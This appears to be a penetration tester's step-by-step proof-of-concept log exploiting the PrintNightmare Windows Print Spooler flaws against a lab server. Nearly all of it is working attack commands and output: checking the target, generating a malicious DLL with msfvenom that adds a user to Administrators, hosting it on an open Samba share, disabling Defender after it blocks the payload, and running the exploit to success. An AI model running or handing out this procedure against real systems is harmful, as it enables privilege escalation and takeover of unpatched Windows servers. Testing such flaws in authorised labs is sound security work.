=======================================================================================================================
PrintNightmare remote exploit tests (CVE-2021-1675 & CVE-2021-34527)
=======================================================================================================================

PrintNightmare is the name given to a group of vulnerabilities affecting the Windows Print Spooler service (CVE-2021-1675 and CVE-2021-34527).
A low-privileged account (local account or domain user) is required to exploit these vulnerabilities.

Links:
> https://github.com/ly4k/PrintNightmare
> https://github.com/cube0x0/CVE-2021-1675


===================================================================================================================
PoC - Step 1. Check if the targeted server 2016 is vulnerable to PrintNightmare (a low priv account is needed)
===================================================================================================================

=> Source: https://github.com/ly4k/PrintNightmare


$ python3 ./PrintNightmare.py -debug -check 'auditor:Test1234@192.168.1.38' -dll '\\192.168.1.45\smb\privesc.dll'                                                    130 â¨¯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[+] Binding to 'ncacn_np:192.168.1.38[\\PIPE\\spoolss]'
[+] Bind OK
[*] Target appears to be vulnerable!


$ python3 ./PrintNightmare.py -debug -list 'auditor:Test1234@192.168.1.38'                                                                                             2 â¨¯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Enumerating printer drivers
[+] Binding to 'ncacn_np:192.168.1.38[\\PIPE\\spoolss]'
[+] Bind OK
Name:               Microsoft XPS Document Writer v4
Environment:        Windows x64
Driver path:        C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_7b3eed059f4c3e41\Amd64\mxdwdrv.dll
Data file:          C:\Windows\System32\DriverStore\FileRepository\prnms001.inf_amd64_10bd6dee10a7dfd0\MXDW.gpd
Config file:        C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_be4393c143e46548\Amd64\PrintConfig.dll
Version:            4
----------------------------------------------------------------
Name:               Microsoft Print To PDF
Environment:        Windows x64
Driver path:        C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_7b3eed059f4c3e41\Amd64\mxdwdrv.dll
Data file:          C:\Windows\System32\DriverStore\FileRepository\prnms009.inf_amd64_bd3f6a64dee1535d\MPDW-PDC.xml
Config file:        C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_be4393c143e46548\Amd64\PrintConfig.dll
Version:            4
----------------------------------------------------------------
Name:               Microsoft XPS Document Writer v5
Environment:        Windows x64
Driver path:        C:\Windows\system32\spool\DRIVERS\x64\3\UNIDRV.DLL
Data file:          C:\Windows\system32\spool\DRIVERS\x64\3\printprivesc.dll
Config file:        C:\Windows\system32\spool\DRIVERS\x64\3\ntdll.dll
Version:            3
----------------------------------------------------------------
Name:               Microsoft enhanced Point and Print compatibility driver
Environment:        Windows x64
Driver path:        C:\Windows\system32\spool\DRIVERS\x64\3\mxdwdrv.dll
Data file:          C:\Windows\system32\spool\DRIVERS\x64\3\unishare.gpd
Config file:        C:\Windows\system32\spool\DRIVERS\x64\3\PrintConfig.dll
Version:            3
----------------------------------------------------------------


===================================================================================================================
PoC - Step 2. Prepare the attack
===================================================================================================================

2.1 Create a malicious ".dll"
-------------------------------------------------------------------------------------------------------------------

$ msfvenom -a x64 -p windows/x64/exec cmd='net localgroup Administrators auditor /add' -f dll > privesc.dll 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 310 bytes
Final size of dll file: 8704 bytes


2.2 Set up a SAMBA 'smbd' server to share over the network the malicious ".dll"
-------------------------------------------------------------------------------------------------------------------

$ sudo gedit /etc/samba/smb.conf

** (gedit:26926): WARNING **: 12:23:51.984: Set document metadata failed: Setting attribute metadata::gedit-position not supported
                                                                                                                                                                                                                                             
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo more /etc/samba/smb.conf
#
# Sample configuration file for the Samba suite for Debian GNU/Linux.
#
#
# This is the main Samba configuration file. You should read the
# smb.conf(5) manual page in order to understand the options listed
# here. Samba has a huge number of configurable options most of which 
# are not shown in this example
#
# Some options that are often worth tuning have been included as
# commented-out examples in this file.
#  - When such options are commented with ";", the proposed setting
#    differs from the default Samba behaviour
#  - When commented with "#", the proposed setting is the default
#    behaviour of Samba but the option is considered important
#    enough to be mentioned here
#
# NOTE: Whenever you modify this file you should run the command
# "testparm" to check that you have not made any basic syntactic 
# errors. 

#======================= Global Settings =======================

[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445

[smb]
    comment = Samba
    path = /tmp/
    guest ok = yes
    read only = yes
    browsable = yes
    force user = nobody

<SNIP>


$ sudo service smbd start


===================================================================================================================
PoC - Step 3. Exploit of the PrintNightmare remote code execution vulnerability
===================================================================================================================

$ python3 ./PrintNightmare.py -debug 'auditor:Test1234@192.168.1.38' -dll '\\192.168.1.45\smb\privesc.dll'                                                       1 â¨¯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[+] Binding to 'ncacn_np:192.168.1.38[\\PIPE\\spoolss]'
[+] Bind OK
[*] Enumerating printer drivers
[*] Driver name: 'Microsoft XPS Document Writer v5'
[*] Driver path: 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_7b3eed059f4c3e41\\Amd64\\UNIDRV.DLL'
[*] DLL path: '\\\\192.168.1.45\\smb\\privesc.dll'
[*] Copying over DLL
[-] Failed to create printer driver: RPRN SessionError: code: 0xe1 - ERROR_VIRUS_INFECTED - Operation did not complete successfully because the file contains a virus or potentially unwanted software.


=> The exploit works but as expected the malicious '.dll' generated with the metasploit framework is detected and blocked by the Defender AV.

=> For testing purposes we temporarily disable the Defender AV.

$ python3 ./PrintNightmare.py -debug 'auditor:Test1234@192.168.1.38' -dll '\\192.168.1.45\smb\privesc.dll'                                                             1 â¨¯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[+] Binding to 'ncacn_np:192.168.1.38[\\PIPE\\spoolss]'
[+] Bind OK
[*] Enumerating printer drivers
[*] Driver name: 'Microsoft XPS Document Writer v5'
[*] Driver path: 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_7b3eed059f4c3e41\\Amd64\\UNIDRV.DLL'
[*] DLL path: '\\\\192.168.1.45\\smb\\privesc.dll'
[*] Copying over DLL
[*] Successfully copied over DLL
[*] Trying to load DLL
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 604, in readFile
    bytesRead = self._SMBConnection.read_andx(treeId, fileId, offset, toRead)
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1979, in read_andx
    return self.read(tid, fid, offset, max_size, wait_answer)
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1316, in read
    if ans.isValidAnswer(STATUS_SUCCESS):
  File "/usr/lib/python3/dist-packages/impacket/smb3structs.py", line 458, in isValidAnswer
    raise smb3.SessionError(self['Status'], self)
impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_BROKEN(The pipe operation has failed because the other end of the pipe has been closed.)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/kali/Documents/./PrintNightmare.py", line 760, in <module>
    print_nightmare.exploit(options.name, options.env, options.path, options.dll)
  File "/home/kali/Documents/./PrintNightmare.py", line 571, in exploit
    resp = hRpcAddPrinterDriverEx(
  File "/home/kali/Documents/./PrintNightmare.py", line 277, in hRpcAddPrinterDriverEx
    return dce.request(request)
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 859, in request
    answer = self.recv()
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1310, in recv
    response_data = self._transport.recv(forceRecv, count=MSRPCRespHeader._SIZE)
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/transport.py", line 553, in recv
    return self.__smb_connection.readFile(self.__tid, self.__handle)
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 610, in readFile
    raise SessionError(e.get_error_code(), e.get_error_packet())
impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_BROKEN(The pipe operation has failed because the other end of the pipe has been closed.)
                                                                                

=> There is a an error message but the exploit worked !!


